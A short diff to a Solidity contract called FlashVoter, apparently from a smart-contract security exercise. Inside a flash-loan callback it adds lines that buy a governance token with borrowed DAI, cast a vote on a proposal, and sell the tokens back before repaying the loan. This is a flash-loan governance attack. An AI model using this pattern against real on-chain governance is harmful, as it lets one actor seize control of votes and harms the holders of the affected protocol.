@@ -45,6 +45,11 @@ contract FlashVoter {
         uint256[] calldata premiums,
         address, bytes calldata
     ) external returns(bool) {
+        DAI.approve(address(governanceToken), borrowAmount);
+
+        governanceToken.buy(borrowAmount);
+        governanceToken.vote(proposalId, true);//or false, your choice
+        governanceToken.sell(borrowAmount);
 
         uint totalOwed = amounts[0] + premiums[0];
         DAI.approve(address(pool), totalOwed);
